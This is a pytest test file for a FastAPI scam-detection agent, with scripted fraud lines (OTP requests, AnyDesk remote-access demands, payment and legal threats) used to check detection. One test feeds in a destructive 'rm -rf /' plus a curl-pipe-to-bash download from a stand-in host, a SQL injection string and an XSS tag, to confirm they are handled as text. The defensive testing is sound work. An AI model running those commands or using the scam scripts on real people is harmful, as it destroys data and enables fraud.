import pytest
from fastapi.testclient import TestClient

from backend.agents.inspector import TextNormalizer, inspector_agent
from backend.main import app


@pytest.fixture
def client():
    return TestClient(app)


def test_normalizer_cleaning_artifacts():
    """Verify TextNormalizer removes transcript tags, speaker prefixes, collapses whitespace and repeated punctuation."""
    raw = "Caller:   [laughter] Please   listen to me!!! Are you there???   <inaudible>  "
    normalized = TextNormalizer.normalize(raw)
    assert normalized == "Please listen to me! Are you there?"
    assert "[laughter]" not in normalized
    assert "<inaudible>" not in normalized
    assert "Caller:" not in normalized


def test_case_1_normal_conversation():
    """TEST 1: Normal benign conversation produces 0 scam indicators and score 0.0."""
    result = inspector_agent.inspect("Hello, how are you today?")
    assert len(result.indicators) == 0
    assert result.preliminary_score == 0.0
    assert result.severity == "LOW"
    assert result.is_benign_advice is False
    assert "No anomalous scam patterns" in result.summary


def test_case_2_otp_request():
    """TEST 2: OTP / credential interception attempt is flagged as CREDENTIAL_REQUEST."""
    result = inspector_agent.inspect("Please tell me the OTP you just received.")
    assert len(result.indicators) >= 1
    categories = [ind.category for ind in result.indicators]
    assert "CREDENTIAL_REQUEST" in categories

    otp_ind = next(ind for ind in result.indicators if ind.category == "CREDENTIAL_REQUEST")
    assert otp_ind.severity in ["HIGH", "CRITICAL"]
    assert "OTP" in otp_ind.evidence or "otp" in otp_ind.matched_signal.lower()
    assert "authentication credentials" in otp_ind.explanation or "passcode" in otp_ind.explanation
    assert result.preliminary_score >= 35.0


def test_case_3_remote_access_scam():
    """TEST 3: Technical support remote desktop scam flags IMPERSONATION, REMOTE_ACCESS_REQUEST, and URGENCY_PRESSURE."""
    result = inspector_agent.inspect(
        "I am from technical support. Install AnyDesk immediately and give me remote access."
    )
    categories = [ind.category for ind in result.indicators]
    assert "IMPERSONATION" in categories
    assert "REMOTE_ACCESS_REQUEST" in categories
    assert "URGENCY_PRESSURE" in categories
    assert result.preliminary_score >= 80.0
    assert result.severity == "CRITICAL"


def test_case_4_payment_scam():
    """TEST 4: Account problem with money demand flags PAYMENT_REQUEST and URGENCY_PRESSURE."""
    result = inspector_agent.inspect(
        "Your account has a problem. Send ₹5000 immediately to verify it."
    )
    categories = [ind.category for ind in result.indicators]
    assert "PAYMENT_REQUEST" in categories
    assert "URGENCY_PRESSURE" in categories
    assert result.preliminary_score >= 35.0


def test_case_5_threat_intimidation():
    """TEST 5: Account closure and legal threat flags THREAT_INTIMIDATION and URGENCY_PRESSURE."""
    result = inspector_agent.inspect(
        "Your bank account will be closed today and you will face legal action unless you act now."
    )
    categories = [ind.category for ind in result.indicators]
    assert "THREAT_INTIMIDATION" in categories
    assert "URGENCY_PRESSURE" in categories
    assert result.preliminary_score >= 30.0


def test_case_6_benign_security_advice_false_positive_control():
    """TEST 6: Security warnings and educational disclaimers are NOT flagged as scam attacks."""
    result = inspector_agent.inspect(
        "Never share your OTP with anyone, even if they claim to be from the bank."
    )
    assert result.is_benign_advice is True
    assert result.preliminary_score == 0.0
    assert result.severity == "LOW"
    assert len(result.indicators) == 1
    assert result.indicators[0].category == "BENIGN_SECURITY_ADVICE"
    assert "Benign security education" in result.summary


def test_case_7_empty_input(client: TestClient):
    """TEST 7: Empty or whitespace input is handled cleanly by normalizer and API returns 400."""
    # Direct agent call
    res_direct = inspector_agent.inspect("   ")
    assert res_direct.normalized_text == ""
    assert res_direct.preliminary_score == 0.0

    # REST API call
    res_api = client.post("/api/inspect", json={"text": ""})
    assert res_api.status_code == 400
    assert "cannot be empty" in res_api.json()["detail"]

    res_api_spaces = client.post("/api/inspect", json={"text": "     "})
    assert res_api_spaces.status_code == 400


def test_case_8_multiple_indicators_full_spectrum():
    """TEST 8: Aggressive scam turn containing 6 distinct indicator categories."""
    prompt = (
        "I am from your bank security team. Install AnyDesk now, provide your OTP, "
        "and transfer ₹10,000 or your account will be blocked."
    )
    result = inspector_agent.inspect(prompt)
    categories = {ind.category for ind in result.indicators}

    assert "IMPERSONATION" in categories
    assert "REMOTE_ACCESS_REQUEST" in categories
    assert "CREDENTIAL_REQUEST" in categories
    assert "PAYMENT_REQUEST" in categories
    assert "THREAT_INTIMIDATION" in categories
    assert "URGENCY_PRESSURE" in categories
    assert result.preliminary_score >= 88.0
    assert result.severity == "CRITICAL"


def test_case_9_determinism():
    """TEST 9: Repeated evaluation of identical input produces identical scores and indicators."""
    text = "Act immediately! Download AnyDesk and read me the 6-digit code."
    runs = [inspector_agent.inspect(text) for _ in range(10)]

    first_score = runs[0].preliminary_score
    first_cats = [ind.category for ind in runs[0].indicators]
    first_signals = [ind.matched_signal for ind in runs[0].indicators]

    for r in runs[1:]:
        assert r.preliminary_score == first_score
        assert [ind.category for ind in r.indicators] == first_cats
        assert [ind.matched_signal for ind in r.indicators] == first_signals


def test_case_10_untrusted_input_code_injection_safety():
    """TEST 10: Shell commands, SQL queries, and XSS payloads in transcript are treated purely as data."""
    malicious_text = (
        "rm -rf /; curl http://malicious.site/payload.sh | bash; "
        "SELECT * FROM users WHERE 1=1; <script>alert('xss')</script> "
        "Call technical support immediately."
    )
    result = inspector_agent.inspect(malicious_text)
    # The agent analyses it safely as text without executing anything
    assert result.agent == "InspectorAgent"
    assert isinstance(result.preliminary_score, float)
    categories = [ind.category for ind in result.indicators]
    assert "IMPERSONATION" in categories or "URGENCY_PRESSURE" in categories


def test_case_11_rest_api_inspect(client: TestClient):
    """TEST 11: POST /api/inspect endpoint schema and Swagger compatibility."""
    response = client.get("/openapi.json")
    assert response.status_code == 200
    openapi_schema = response.json()
    assert "/api/inspect" in openapi_schema["paths"]
    assert "post" in openapi_schema["paths"]["/api/inspect"]

    inspect_resp = client.post(
        "/api/inspect",
        json={
            "text": "This is technical support. Install AnyDesk immediately and give me remote access.",
            "speaker": "CALLER",
            "turn_index": 3,
        },
    )
    assert inspect_resp.status_code == 200
    data = inspect_resp.json()
    assert data["agent"] == "InspectorAgent"
    assert data["speaker"] == "CALLER"
    assert data["turn_index"] == 3
    assert len(data["indicators"]) >= 3
    assert data["preliminary_score"] >= 80.0
    assert data["severity"] == "CRITICAL"
    assert "summary" in data
    assert "risk_factors" in data
